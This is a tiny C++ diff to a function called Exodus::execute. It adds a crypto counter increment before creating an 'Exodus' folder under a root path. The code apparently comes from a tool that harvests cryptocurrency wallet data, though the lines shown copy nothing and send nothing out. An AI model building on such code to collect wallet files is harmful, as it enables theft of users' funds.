@@ -12,6 +12,7 @@ void Exodus::execute(fs::path &root) {
     if(paths.empty())
         return;
 
+    Counter::increaseCrypto();
     fs::path dst = root / "Exodus";
     fs::create_directories(dst);
 
